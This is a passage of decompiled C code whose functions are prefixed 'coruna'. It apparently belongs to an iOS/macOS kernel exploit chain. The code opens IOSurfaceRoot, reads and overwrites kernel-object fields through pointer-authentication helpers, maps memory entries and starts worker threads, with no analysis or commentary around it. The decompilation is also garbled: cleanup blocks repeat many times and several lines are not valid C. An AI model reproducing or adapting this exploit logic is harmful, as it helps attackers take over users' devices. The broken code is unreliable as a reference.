                                             *(uint64_t *)(serial + 0x30) = 0;
                                             *(uint64_t *)(serial + 0x50) = 0;
                                             status = (int)copy;
                                             {
                                             {
                                             if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
                                             return;
                                             }
                                             ___stack_chk_fail(str);
                                             }
                                             break;
                                             }
                                             flags = flags + 1;
                                           }
                                        {
                                          serial = *ptr;
                                          *(uint64_t *)(serial + 0x30) = 0;
                                          *(uint64_t *)(serial + 0x50) = 0;
                                          status = (int)copy;
                                          {
                                          {
                                          if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
                                          return;
                                          }
                                          ___stack_chk_fail(str);
                                          }
                                          break;
                                          }
                                          flags = flags + 1;
                                        }
                                      }
                                    }
                                  }
                                  thread_attr = thread_attr + (long)*(int *)(serial + 0x168);
                                  copy = (uint8_t *)0xad011;
                                } while (thread_attr < type_id);
                              }
                            }
                            _close(status);
                          }
                          {
                            if ((int)cache != -1) {
                            _close((int)cache);
                            }
                            version = cache;
                            if (cache != 0xffffffff) {
                            version = _close(cache);
                            }
                            str = (uint8_t *)(unsigned long)version;
                            *(uint64_t *)(&k_kernel_slot_1930 + *ptr) = 0xffffffffffffffff;
                            serial = *ptr;
                            *(uint64_t *)(serial + 0x30) = 0;
                            *(uint64_t *)(serial + 0x50) = 0;
                            status = (int)copy;
                            {
                            {
                            if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
                            return;
                            }
                            ___stack_chk_fail(str);
                            }
                            break;
                            }
                            flags = flags + 1;
                          }
                        }
                      }
                      {
                        serial = *ptr;
                        *(uint64_t *)(serial + 0x30) = 0;
                        *(uint64_t *)(serial + 0x50) = 0;
                        status = (int)copy;
                        {
                        {
                        if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
                        return;
                        }
                        ___stack_chk_fail(str);
                        }
                        break;
                        }
                        flags = flags + 1;
                      }
                    }
                  }
                }
              }
            }
          }
check_ok:
          if ((int)cache != -1) {
            _close((int)cache);
          }
          version = cache;
          if (cache != 0xffffffff) {
            version = _close(cache);
          }
          str = (uint8_t *)(unsigned long)version;
          *(uint64_t *)(&k_kernel_slot_1930 + *ptr) = 0xffffffffffffffff;
          {
            serial = *ptr;
            *(uint64_t *)(serial + 0x30) = 0;
            *(uint64_t *)(serial + 0x50) = 0;
            status = (int)copy;
            {
            {
            if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
            return;
            }
            ___stack_chk_fail(str);
            }
            break;
            }
            flags = flags + 1;
          }
        }
        *(uint32_t **)(data + 0x750) = buf;
        *(void (**)(data + 0xc) = coruna_kernel5_residual_217;
        *(uint32_t **)(data + 0x14) = buf;
        serial = *(long *)(buf + 0xa0);
        if (serial == 0) {
          str = (uint8_t *)coruna_kernel5_residual_218(buf);
          copy = str;
          {
            serial = *ptr;
            *(uint64_t *)(serial + 0x30) = 0;
            *(uint64_t *)(serial + 0x50) = 0;
            status = (int)copy;
            {
            {
            if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
            return;
            }
            ___stack_chk_fail(str);
            }
            break;
            }
            flags = flags + 1;
          }
          serial = *(long *)(buf + 0xa0);
        }
        str = (uint8_t *)coruna_kernel5_via_kernel5_via_ioservicegetmatchingservice_4(buf,serial + (unsigned long)(uint)buf[0x95],ptr,0);
        if ((int)str == 0) {
          *(uint64_t *)(&k_kernel_slot_19d0 + *(long *)(buf + 2)) = *(uint64_t *)(buf + 0xa2);
          str = (uint8_t *)coruna_open_iosurface_root_aae0(buf);
          copy = str;
          if ((int)str == 0) {
            serial = *ptr;
            if (0x44a < *(unsigned long *)(serial + 0x158) >> 0x2b) {
              status = 0;
              goto skip;
            }
            region = 0;
            frame = 0;
            work = 0;
            url_buf = 0;
            json_buf = 0;
            sa_new = 0;
            path_buf = 0;
            stack_guard = 0;
            action = (uint32_t *)0x0;
            size = *(vm_size_t *)k_kernel_vm_page_size_slot;
            serial_buf[1] = 0x80;
            base = 0x100;
            if (*(int *)(serial + 0x140) < 0x2258) {
              base = 0x118;
            }
            ctx_val = 0x108;
            if (*(int *)(serial + 0x140) < 0x2258) {
              ctx_val = 0x120;
            }
            handle = _IOServiceMatching("IOSurfaceRoot");
            copy = (uint8_t *)0xad022;
            if (handle != 0) {
              tag = _IOServiceGetMatchingService(u,handle);
              copy = (uint8_t *)0xad022;
              if (1 < (int)tag + 1U) {
                status = _IOServiceOpen(tag,*(uint32_t *)k_kernel_mach_task_self_slot,0,
                                       &region);
                copy = (uint8_t *)0xad022;
                if ((status == 0) && (copy = (uint8_t *)0xad022, 1 < region + 1U)) {
                  scratch = 0x2800f;
                  handle = coruna_ret_stub_8(serial);
                  if (handle == 0) {
                    copy = (uint8_t *)0x2800e;
                  }
                  else {
                    addr = coruna_kernel5_via_pacia_5(serial,handle);
                    if (addr != 0) {
                      status = 8;
next:
                      copy = (uint8_t *)coruna_dlopen_iosurface_c870(serial,region,&tmp_buf);
                      if ((int)copy != 0) goto retry;
                      err = coruna_ret_stub_6(serial,addr + ctx_val,8,&cache_20);
                      version = tmp_buf;
                      if (err != 0) {
                        if (cache_20 <= tmp_buf) {
found:
                          copy = (uint8_t *)0x28011;
                          goto retry;
                        }
                        err = coruna_kernel5_residual_257(serial,addr + base,&cache);
                        if (err == 0) goto nomem;
                        off = coruna_pacia(serial,cache);
                        if (off == 0) {
invalid:
                          copy = (uint8_t *)0x28026;
                          goto retry;
                        }
                        err = coruna_kernel5_residual_257(serial,cache + (version << 3),&work);
                        if (err == 0) goto nomem;
                        off = coruna_pacia(serial,work);
                        if (off == 0) goto invalid;
                        err = coruna_kernel5_residual_257(serial,work + 0x40,&frame);
                        if (err == 0) goto nomem;
                        off = coruna_pacia(serial,frame);
                        if (off == 0) goto invalid;
                        if ((unsigned long)*(uint *)(serial + 0x180) -
                            (*(unsigned long *)(serial + 0x188) & frame) < 0x500) {
                          copy = (uint8_t *)0xad011;
                          status = status + -1;
                          if (status == 0) goto retry;
                          goto next;
                        }
                        status = coruna_ret_stub_6(serial,addr + 0x99,1,&block_ctx);
                        if (status == 0) goto nomem;
                        if (block_ctx != '\0') goto found;
                        status = coruna_kernel5_residual_257(serial,addr + 0x88,&cache_21);
                        if (status != 0) {
                          base = coruna_pacia(serial,cache_21);
                          if (base == 0) goto invalid;
                          status = coruna_call_mach_vm_machine_attribute_1d4f8(serial,cache_21 + 8,0);
                          if (status != 0) {
                            if (0x2257ffffffffff < *(unsigned long *)(serial + 0x158)) {
                              plist = plist & 0xffffff00;
                              status = coruna_ret_stub_6(serial,addr + 0x11f,1,&plist);
                              if (status != 0) {
                                if ((plist & 0xff) == 0) goto again;
                                if ((plist & 0xff) == 1) {
                                  plist = plist & 0xffffff00;
                                  status = coruna_ret_stub_7(serial,addr + 0x11f,&plist,1);
                                  if (status != 0) goto again;
                                  scratch = 0x28010;
                                }
                                else {
                                  scratch = 0x28011;
                                }
                              }
                              copy = (uint8_t *)(unsigned long)scratch;
                              goto retry;
                            }
again:
                            block_ctx = '@';
                            status = coruna_ret_stub_7(serial,addr + 0x99,&block_ctx,1);
                            if (status != 0) {
                              copy = (uint8_t *)coruna_memmem(buf,frame,&json_buf);
                              kind = frame;
                              type_id = json_buf;
                              if ((int)copy != 0) goto retry;
                              if (json_buf == 0) {
                                copy = &k_kernel_slot_1001;
                                goto retry;
                              }
                              type_id_8 = *(unsigned long *)(serial + 0x188);
                              base = coruna_vm_deallocate_2a1cc(serial,serial_buf + 1);
                              if (base == 0) {
                                copy = (uint8_t *)0xad009;
                                goto retry;
                              }
                              sa_saved = *(vm_size_t *)k_kernel_vm_page_size_slot;
                              port = _mach_make_memory_entry
                                                (*(vm_map_t *)k_kernel_mach_task_self_slot,
                                                 &sa_saved,0,0x20003,&stack_guard,0);
                              if ((port != 0) ||
                                 (port = _vm_map(*(vm_map_t *)k_kernel_mach_task_self_slot,
                                                  (vm_address_t *)&action,size,0,1,stack_guard,0,0,
                                                  3,2,(vm_inherit_t)handle), port != 0)) {
exit_ok:
                                copy = (uint8_t *)(unsigned long)(port | 0x80000000);
                                goto retry;
                              }
                              *action = 0;
                              _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,
                                             (vm_address_t)action,size);
                              ctx_val = coruna_kernel5_via_kernel5_via_pacia_5(serial,stack_guard);
                              if (ctx_val == 0) goto parse_ok;
                              status = coruna_kernel5_residual_257(serial,ctx_val + (unsigned long)(4 < *(long *)(serial + 
                                                  0x158) + 0xffe0abe700000000U >> 0x20) * 0x10,
                                                  &path_buf);
                              if (status == 0) goto nomem;
                              ctx_val = coruna_pacia(serial,path_buf);
                              if (ctx_val == 0) goto invalid;
                              if (0x1c1a < *(int *)(serial + 0x140)) {
                                status = coruna_kernel5_residual_257(serial,path_buf + 0x20,&sa_new);
                                if (status != 0) {
                                  ctx_val = coruna_pacia(serial,sa_new);
                                  if (ctx_val != 0) {
                                    status = coruna_kernel5_via_kernel5_via_kernel5_via_thread_get_state_2(serial,sa_new + 0x38,&url_buf);
                                    if (status == 0) goto nomem;
                                    if (0x1f542301dfffff < *(unsigned long *)(serial + 0x158)) {
                                      url_buf = coruna_kernel5_residual_259(serial,url_buf >> 0x20);
                                    }
                                    ctx_val = coruna_pacia(serial,url_buf);
                                    if (ctx_val != 0) goto load_ok;
                                  }
                                  goto invalid;
                                }
                                goto nomem;
                              }
                              url_buf = path_buf;
load_ok:
                              size = url_buf;
                              ctx_val = coruna_kernel5_via_pacia_12_20(serial,0,&plist);
                              if (ctx_val == 0) goto load_ok_15;
                              cache_22[1] = 0;
                              cache_22[0] = 0;
                              bootargs = 0;
                              cache_23 = 0;
                              cache_22[2] = 0;
                              cache_25 = 0;
                              if (*(unsigned long *)k_kernel_vm_page_size_slot != 0) {
                                cache_25 = (type_id & (type_id_8 ^ 0xffffffffffffffff)) /
                                           *(unsigned long *)k_kernel_vm_page_size_slot;
                              }
                              cache_24 = 0x140;
                              thread_attr = (uint32_t)(size - ctx_val >> ((unsigned long)plist & 0x3f));
                              host_info = 0x2000000;
                              status = coruna_ret_stub_7(serial,base,cache_22,0x38);
                              copy = (uint8_t *)0x28010;
                              if ((status == 0) ||
                                 (status = coruna_call_mach_vm_machine_attribute_1d4f8(serial,url_buf + 0x20,base), status == 0))
                              goto retry;
                              status = coruna_kernel5_via_kernel5_via_kernel5_via_thread_get_state(serial,url_buf + 0x74,serial_buf);
                              copy = (uint8_t *)0x2800f;
                              if (status == 0) goto retry;
                              if (((serial_buf[0] ^ 0xffffffff) & 0x90000) != 0) goto found;
                              status = coruna_mach_vm_machine_attribute(serial,url_buf + 0x74,serial_buf[0] | 0x1000);
                              if (status != 0) {
                                port = _vm_map(*(vm_map_t *)k_kernel_mach_task_self_slot,
                                                (vm_address_t *)&action,size,0,1,stack_guard,0,0,3,
                                                2,(vm_inherit_t)handle);
                                if (port != 0) goto exit_ok;
                                *(int *)(serial + 0xe8) = region;
                                *(unsigned long *)(serial + 0xf0) = frame;
                                *(uint32_t **)(serial + 0xf8) = action;
                                *(vm_size_t *)(serial + 0x100) = size;
                                *(unsigned long *)(serial + 0x108) = kind & type_id_8;
                                *(uint *)(serial + 0x110) = version;
                                *(mem_entry_name_port_t *)(serial + 0x114) = stack_guard;
                                copy = (uint8_t *)0x28001;
                                if (((region + 1U < 2) || (action == (uint32_t *)0x0)) ||
                                   (size == 0)) goto retry;
                                status = coruna_kernel5_via_ret_stub_6_3(serial,handle,0x10);
                                if (status != 0) {
                                  str = (uint8_t *)coruna_vm_deallocate(obj);
                                  copy = (uint8_t *)0x0;
                                  {
                                    serial = *ptr;
                                    *(uint64_t *)(serial + 0x30) = 0;
                                    *(uint64_t *)(serial + 0x50) = 0;
                                    status = (int)copy;
                                    {
                                    {
                                    if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
                                    return;
                                    }
                                    ___stack_chk_fail(str);
                                    }
                                    break;
                                    }
                                    flags = flags + 1;
                                  }
                                }
                              }
                            }
                          }
load_ok_15:
                          copy = (uint8_t *)0x28010;
                          goto retry;
                        }
                      }
nomem:
                      copy = (uint8_t *)0x2800f;
                      goto retry;
                    }
parse_ok:
                    copy = (uint8_t *)0x28025;
                  }
                }
              }
            }
retry:
            str = (uint8_t *)coruna_vm_deallocate(obj);
            *(uint32_t *)(*ptr + 0xe8) = 0;
          }
          {
            serial = *ptr;
            *(uint64_t *)(serial + 0x30) = 0;
            *(uint64_t *)(serial + 0x50) = 0;
            status = (int)copy;
            {
            {
            if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
            return;
            }
            ___stack_chk_fail(str);
            }
            break;
            }
            flags = flags + 1;
          }
        }
        serial = *ptr;
        status = 0x3f002;
skip:
        *(uint64_t *)(serial + 0x30) = 0;
        *(uint64_t *)(serial + 0x50) = 0;
load_ok_16:
        {
          if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
          return;
          }
          ___stack_chk_fail(str);
        }
        break;
      }
fail:
      serial = *ptr;
      *(uint64_t *)(serial + 0x30) = 0;
      *(uint64_t *)(serial + 0x50) = 0;
      status = (int)copy;
      {
        {
        if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
        return;
        }
        ___stack_chk_fail(str);
        }
        break;
      }
      flags = flags + 1;
    } while (flags != 5);
  }
  str = (uint8_t *)coruna_pthread_from_mach_thread_np(buf);
load_ok_17:
  if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
    return;
  }
  ___stack_chk_fail(str);
}
void coruna_pthread_from_mach_thread_np(void *ctx)
{
  int err;
  pthread_t p_Var2;
  unsigned long u;
  
  if (ctx != (void *)0x0) {
    u = *(unsigned long *)(*(uint **)((long)ctx + 8) + 0x56);
    if ((0x1f530f027fffff < u) &&
       ((**(uint **)((long)ctx + 8) & 0x5584001) != 0 || 0x1f5418ffffffff < u)) {
      if (1 < *(mach_port_name_t *)((long)ctx + 0x680) + 1) {
        _mach_port_deallocate
                  (*(ipc_space_t *)k_kernel_mach_task_self_slot,
                   *(mach_port_name_t *)((long)ctx + 0x680));
      }
      *(uint32_t *)((long)ctx + 0x680) = 0;
      if (1 < *(int *)((long)ctx + 0x67c) + 1U) {
        _IOObjectRelease();
      }
      *(uint32_t *)((long)ctx + 0x67c) = 0;
      err = _pthread_mutex_destroy((pthread_mutex_t *)((long)ctx + 0x6d0));
      if (err != 0) {
        return;
      }
      *(uint64_t *)((long)ctx + 0x6f8) = 0;
      *(uint64_t *)((long)ctx + 0x6f0) = 0;
      *(uint64_t *)((long)ctx + 0x708) = 0;
      *(uint64_t *)((long)ctx + 0x700) = 0;
      *(uint64_t *)((long)ctx + 0x6d8) = 0;
      ((pthread_mutex_t *)((long)ctx + 0x6d0))->__sig = 0;
      *(uint64_t *)((long)ctx + 0x6e8) = 0;
      *(uint64_t *)((long)ctx + 0x6e0) = 0;
    }
    *(uint64_t *)((long)ctx + 0x2d8) = 0;
    if (*(char *)((long)ctx + 0x634) != '\0') {
      p_Var2 = _pthread_from_mach_thread_np(*(mach_port_t *)((long)ctx + 0x300));
      _thread_resume(*(thread_act_t *)((long)ctx + 0x300));
      _pthread_join(p_Var2,(void **)0x0);
    }
    if (*(void **)((long)ctx + 0x2b8) != (void *)0x0) {
      _free(*(void **)((long)ctx + 0x2b8));
      *(uint64_t *)((long)ctx + 0x2b8) = 0;
    }
    if (*(void **)((long)ctx + 0x2c0) != (void *)0x0) {
      _free(*(void **)((long)ctx + 0x2c0));
      *(uint64_t *)((long)ctx + 0x2c0) = 0;
    }
    _pthread_mutex_destroy((pthread_mutex_t *)((long)ctx + 0x638));
    *(uint64_t *)((long)ctx + 0x640) = 0;
    ((pthread_mutex_t *)((long)ctx + 0x638))->__sig = 0;
    *(uint64_t *)((long)ctx + 0x650) = 0;
    *(uint64_t *)((long)ctx + 0x648) = 0;
    *(uint64_t *)((long)ctx + 0x660) = 0;
    *(uint64_t *)((long)ctx + 0x658) = 0;
    *(uint64_t *)((long)ctx + 0x670) = 0;
    *(uint64_t *)((long)ctx + 0x668) = 0;
    coruna_vm_deallocate_fb08((long)ctx + 0x10);
    coruna_kernel5_via_pthread_mutexattr_destroy((long)ctx + 0xf0);
    *(uint64_t *)(&k_kernel_slot_1d40 + *(long *)((long)ctx + 8)) = 0;
    _free(ctx);
  }
  return;
}
void coruna_mach_port_deallocate(long handle)
{
  uint8_t *ptr;
  int err;
  kern_return_t lk3;
  long handle;
  void *ptr;
  mach_port_name_t scratch;
  vm_address_t bootargs;
  vm_address_t thread_attr;
  
  bootargs = 0;
  thread_attr = 0;
  ptr = *(void **)(&k_kernel_slot_1d40 + handle);
  if ((ptr != (void *)0x0) &&
     ((err = coruna_mach_port_deallocate_139b0(handle,0x11,0x4000,&thread_attr), err == 0 ||
      (err = coruna_mach_make_memory_entry(handle,0x11,0x4000,0,&thread_attr), err == 0)))) {
    handle = 0;
    do {
      if (*(int *)(thread_attr + handle) == 8) {
code_r0x0000a118:
        ptr = k_kernel_mach_task_self_slot;
        lk3 = _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,thread_attr,0x4000);
        if (lk3 != 0) {
          return;
        }
        err = coruna_mach_port_deallocate_139b0(handle,0x12,*(uint64_t *)((long)ptr + 0x110),&bootargs);
        if (err == 0) {
          err = _vm_deallocate(*(vm_map_t *)ptr,bootargs,*(vm_size_t *)((long)ptr + 0x110));
        }
        else {
          err = coruna_mach_make_memory_entry(handle,0x12,*(uint64_t *)((long)ptr + 0x110),
                               *(uint64_t *)((long)ptr + 0x170),0);
        }
        if (err != 0) {
          return;
        }
        if (*(long *)((long)ptr + 0x6c0) == 0) {
          return;
        }
        if (*(int *)((long)ptr + 0x680) + 1U < 2) {
          return;
        }
        scratch = 0;
        err = coruna_ioconnectcallstructmethod(handle,&scratch);
        if (err != 0) {
          coruna_mach_port_deallocate_14398(handle,0x13,*(uint32_t *)((long)ptr + 0x680));
          return;
        }
        _mach_port_deallocate(*(ipc_space_t *)ptr,scratch);
        return;
      }
      if (*(int *)(thread_attr + handle) == 0) {
        _memcpy((void *)(thread_attr + handle),ptr,0x710);
        {
          ptr = k_kernel_mach_task_self_slot;
          lk3 = _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,thread_attr,0x4000);
          if (lk3 != 0) {
          return;
          }
          err = coruna_mach_port_deallocate_139b0(handle,0x12,*(uint64_t *)((long)ptr + 0x110),&bootargs);
          if (err == 0) {
          err = _vm_deallocate(*(vm_map_t *)ptr,bootargs,*(vm_size_t *)((long)ptr + 0x110));
          }
          else {
          err = coruna_mach_make_memory_entry(handle,0x12,*(uint64_t *)((long)ptr + 0x110),
          *(uint64_t *)((long)ptr + 0x170),0);
          }
          if (err != 0) {
          return;
          }
          if (*(long *)((long)ptr + 0x6c0) == 0) {
          return;
          }
          if (*(int *)((long)ptr + 0x680) + 1U < 2) {
          return;
          }
          scratch = 0;
          err = coruna_ioconnectcallstructmethod(handle,&scratch);
          if (err != 0) {
          coruna_mach_port_deallocate_14398(handle,0x13,*(uint32_t *)((long)ptr + 0x680));
          return;
          }
          _mach_port_deallocate(*(ipc_space_t *)ptr,scratch);
          return;
        }
      }
      handle = handle + 0x1000;
    } while (handle != 0x4000);
  }
  return;
}
void coruna_ioconnectcallstructmethod(uint64_t val,mach_port_name_t *arg)
{
  uint u;
  unsigned long size;
  uint64_t scratch;
  mach_port_name_t bootargs;
  uint64_t thread_attr;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  long serial_buf;
  
  serial_buf = *(long *)k_kernel_stack_chk_guard_slot;
  bootargs = 0;
  scratch = 0x40;
  size = coruna_mach_port_mod_refs(val,0x13,&bootargs);
  if ((int)size == 0) {
    host_info = 0;
    host_info = 0;
    action = 0;
    serial_buf = 0;
    scratch = 0;
    thread_attr = 0;
    thread_attr = 0;
    bootargs = 0;
    size = _IOConnectCallStructMethod(bootargs,1,0,0,&thread_attr,&scratch);
    if ((int)size == 0) {
      *arg = bootargs;
      bootargs = 0;
    }
  }
  if (1 < bootargs + 1) {
    u = _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,bootargs);
    size = (unsigned long)u;
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
    return;
  }
  ___stack_chk_fail(size);
}
void coruna_semaphore_create(long handle,uint32_t *size)
{
  long handle;
  int err;
  kern_return_t lk3;
  void *ptr;
  uint64_t u;
  uint64_t size;
  uint64_t version;
  long addr;
  long scratch;
  
  scratch = 0;
  *size = 0;
  err = coruna_mach_port_deallocate_139b0(handle,0x11,0x4000,&scratch);
  handle = scratch;
  if (err == 0) {
    addr = 0;
    do {
      if (*(int *)(scratch + addr) == 8) {
        ptr = _calloc(1,0x710);
        if (ptr == (void *)0x0) {
          return;
        }
        _memcpy(ptr,(void *)(handle + addr),0x6d0);
        *(uint64_t *)((long)ptr + 0x2b8) = 0;
        *(uint32_t *)((long)ptr + 0x2c8) = 0;
        *(uint8_t *)((long)ptr + 0x2cc) = 0;
        *(uint32_t *)((long)ptr + 0x2d0) = 0;
        *(uint64_t *)((long)ptr + 0x2d8) = 0;
        *(uint32_t *)((long)ptr + 0x2e8) = 0;
        *(uint8_t *)((long)ptr + 0x634) = 0;
        *(uint64_t *)((long)ptr + 0x67c) = 0;
        *(uint32_t *)((long)ptr + 0x6c8) = 0;
        *(uint64_t *)((long)ptr + 0x6d8) = 0;
        *(uint64_t *)((long)ptr + 0x6d0) = 0;
        *(uint64_t *)((long)ptr + 0x6e8) = 0;
        *(uint64_t *)((long)ptr + 0x6e0) = 0;
        *(uint64_t *)((long)ptr + 0x6f8) = 0;
        *(uint64_t *)((long)ptr + 0x6f0) = 0;
        *(uint64_t *)((long)ptr + 0x708) = 0;
        *(uint64_t *)((long)ptr + 0x700) = 0;
        *(uint64_t *)((long)ptr + 0x220) = 0;
        *(uint64_t *)((long)ptr + 0x218) = 0;
        *(uint64_t *)((long)ptr + 0x230) = 0;
        *(uint64_t *)((long)ptr + 0x228) = 0;
        *(uint64_t *)((long)ptr + 0x23c) = 0;
        *(uint64_t *)((long)ptr + 0x234) = 0;
        *(uint64_t *)((long)ptr + 0x2a8) = 0;
        *(uint64_t *)((long)ptr + 0x2a0) = 0;
        *(uint64_t *)((long)ptr + 0x2f8) = 0;
        *(uint64_t *)((long)ptr + 0x2f0) = 0;
        *(uint64_t *)((long)ptr + 0x2fd) = 0;
        *(uint32_t *)((long)ptr + 0x677) = 0;
        *(uint64_t *)((long)ptr + 0x660) = 0;
        *(uint64_t *)((long)ptr + 0x658) = 0;
        *(uint64_t *)((long)ptr + 0x670) = 0;
        *(uint64_t *)((long)ptr + 0x668) = 0;
        *(uint64_t *)((long)ptr + 0x640) = 0;
        *(uint64_t *)((long)ptr + 0x638) = 0;
        *(uint64_t *)((long)ptr + 0x650) = 0;
        *(uint64_t *)((long)ptr + 0x648) = 0;
        *(uint64_t *)((long)ptr + 0x690) = 0;
        *(uint64_t *)((long)ptr + 0x688) = 0;
        *(uint64_t *)((long)ptr + 0x6a0) = 0;
        *(uint64_t *)((long)ptr + 0x698) = 0;
        u = *(uint64_t *)((long)ptr + 0x110);
        size = *(uint64_t *)((long)ptr + 0x170);
        version = *(uint64_t *)((long)ptr + 0x1a8);
        *(uint64_t *)((long)ptr + 0x120) = 0;
        *(uint64_t *)((long)ptr + 0x118) = 0;
        *(uint64_t *)((long)ptr + 0x130) = 0;
        *(uint64_t *)((long)ptr + 0x128) = 0;
        *(uint64_t *)((long)ptr + 0x140) = 0;
        *(uint64_t *)((long)ptr + 0x138) = 0;
        *(uint64_t *)((long)ptr + 0x150) = 0;
        *(uint64_t *)((long)ptr + 0x148) = 0;
        *(uint64_t *)((long)ptr + 0x160) = 0;
        *(uint64_t *)((long)ptr + 0x158) = 0;
        *(uint64_t *)((long)ptr + 0x180) = 0;
        *(uint64_t *)((long)ptr + 0x178) = 0;
        *(uint64_t *)((long)ptr + 400) = 0;
        *(uint64_t *)((long)ptr + 0x188) = 0;
        *(uint64_t *)((long)ptr + 0x1a0) = 0;
        *(uint64_t *)((long)ptr + 0x198) = 0;
        *(uint64_t *)((long)ptr + 0x1c0) = 0;
        *(uint64_t *)((long)ptr + 0x1b8) = 0;
        *(uint64_t *)((long)ptr + 0x1d0) = 0;
        *(uint64_t *)((long)ptr + 0x1c8) = 0;
        *(uint64_t *)((long)ptr + 0x1e0) = 0;
        *(uint64_t *)((long)ptr + 0x1d8) = 0;
        *(uint64_t *)((long)ptr + 0x1f0) = 0;
        *(uint64_t *)((long)ptr + 0x1e8) = 0;
        *(uint64_t *)((long)ptr + 0x200) = 0;
        *(uint64_t *)((long)ptr + 0x1f8) = 0;
        *(uint64_t *)((long)ptr + 0x210) = 0;
        *(uint64_t *)((long)ptr + 0x208) = 0;
        *(uint64_t *)((long)ptr + 0x110) = 0;
        *(uint64_t *)((long)ptr + 0x108) = 0;
        *(uint64_t *)((long)ptr + 0x170) = 0;
        *(uint64_t *)((long)ptr + 0x168) = 0;
        *(uint64_t *)((long)ptr + 0x1b0) = 0;
        *(uint64_t *)((long)ptr + 0x1a8) = 0;
        *(uint64_t *)((long)ptr + 0x110) = u;
        *(uint64_t *)((long)ptr + 0x170) = size;
        *(uint64_t *)((long)ptr + 0x1a8) = version;
        *(uint64_t *)((long)ptr + 0x1c8) = 0;
        *(uint64_t *)((long)ptr + 0x1c0) = 0;
        *(uint64_t *)((long)ptr + 0x1d8) = 0;
        *(uint64_t *)((long)ptr + 0x1d0) = 0;
        *(uint64_t *)((long)ptr + 0x1e8) = 0;
        *(uint64_t *)((long)ptr + 0x1e0) = 0;
        *(uint64_t *)((long)ptr + 0x1f8) = 0;
        *(uint64_t *)((long)ptr + 0x1f0) = 0;
        *(uint64_t *)((long)ptr + 0x208) = 0;
        *(uint64_t *)((long)ptr + 0x200) = 0;
        *(uint8_t *)((long)ptr + 0x210) = 0;
        *(long *)((long)ptr + 400) = handle;
        *(long *)((long)ptr + 0x28) = handle;
        *(long *)((long)ptr + 8) = handle;
        *(void (**)((long)ptr + 0x10) = coruna_bzero_2;
        *(void (**)((long)ptr + 0x18) = coruna_ret_stub;
        *(long *)((long)ptr + 0x20) = (long)ptr + 0xf0;
        *(uint32_t *)((long)ptr + 0xd0) = 0;
        *(uint64_t *)((long)ptr + 0xd8) = 0;
        *(uint64_t *)((long)ptr + 0xe0) = 0;
        *(uint64_t *)((long)ptr + 0xe8) = 0;
        err = coruna_pthread_mutexattr_settype();
        if (err != 0) {
          return;
        }
        lk3 = _semaphore_create(*(task_t *)k_kernel_mach_task_self_slot,
                                  (semaphore_t *)((long)ptr + 0x1bc),0,0);
        if (lk3 != 0) {
          return;
        }
        err = coruna_mach_port_deallocate_139b0(handle,0x12,*(uint64_t *)((long)ptr + 0x110),(long)ptr + 0x170
                            );
        if (err != 0) {
          return;
        }
        err = coruna_pthread_mutex_init(ptr);
        if (err != 0) {
          return;
        }
        err = coruna_getpid(ptr);
        if (err != 0) {
          return;
        }
        err = coruna_kernel5_via_vm_deallocate(ptr);
        if (err != 0) {
          return;
        }
        *(void **)(&k_kernel_slot_1d40 + handle) = ptr;
        *(uint64_t *)(&k_kernel_slot_19d0 + handle) = *(uint64_t *)((long)ptr + 0x288);
        err = coruna_open_iosurface_root_aae0(ptr);
        if (err != 0) {
          return;
        }
        *size = 1;
        return;
      }
      addr = addr + 0x1000;
    } while (addr != 0x4000);
  }
  return;
}
void coruna_pthread_mutex_init(void *ctx)
{
  uint u;
  uint size;
  int err;
  kern_return_t lk4;
  void *ptr;
  void **lppv6;
  uint version;
  long handle;
  unsigned long port;
  long addr;
  uint scratch;
  
  size = coruna_ret_stub_5();
  u = size << 1;
  if (u < 9) {
    u = 8;
  }
  err = _pthread_mutex_init((pthread_mutex_t *)((long)ctx + 0x638),(pthread_mutexattr_t *)0x0)
  ;
  if (err == 0) {
    *(uint *)((long)ctx + 0x2c8) = u;
    ptr = _malloc((unsigned long)u << 3);
    *(void **)((long)ctx + 0x2b8) = ptr;
    if (ptr != (void *)0x0) {
      ptr = _calloc((unsigned long)size,8);
      *(void **)((long)ctx + 0x2c0) = ptr;
      if (ptr != (void *)0x0) {
        if (*(int *)((long)ctx + 0xa8) != 0) {
          port = 0;
          do {
            addr = *(long *)((long)ctx + 0xb0) * port;
            scratch = 0;
            err = coruna_ret_stub((long)ctx + 0xf0,*(long *)((long)ctx + 0x2b0) + addr,
                                 &scratch,0);
            if (err != 0) {
              return;
            }
            if (size <= (scratch & 0xffff)) {
              return;
            }
            *(long *)(*(long *)((long)ctx + 0x2c0) + (unsigned long)(ushort)scratch * 8) =
                 *(long *)((long)ctx + 0x2b0) + addr;
            port = port + 1;
          } while (port < *(uint *)((long)ctx + 0xa8));
        }
        *(uint32_t *)((long)ctx + 0x2e8) = 0xffffffff;
        size = 2;
        do {
          *(uint32_t *)((long)ctx + 0x2d0) = 0;
          *(uint16_t *)((long)ctx + 0x2cc) = 0;
          version = size;
          if (u <= size) {
            version = u;
          }
          *(uint64_t *)((long)ctx + 0x2d8) = 0;
          *(uint64_t *)((long)ctx + 0x2e0) = 0;
          *(uint *)((long)ctx + 0x2c8) = version;
          _bzero(*(void **)((long)ctx + 0x2b8),(unsigned long)version << 3);
          if (*(int *)((long)ctx + 0x2c8) != 0) {
            addr = 0;
            port = 0;
            do {
              handle = *(long *)((long)ctx + 0x2b8);
              lppv6 = (void **)coruna_kernel5_via_pacia_16(coruna_pthread_mach_thread_np);
              err = _pthread_create((pthread_t *)(handle + addr),(pthread_attr_t *)0x0,lppv6,
                                      ctx);
              if (err != 0) {
                return;
              }
              port = port + 1;
              addr = addr + 8;
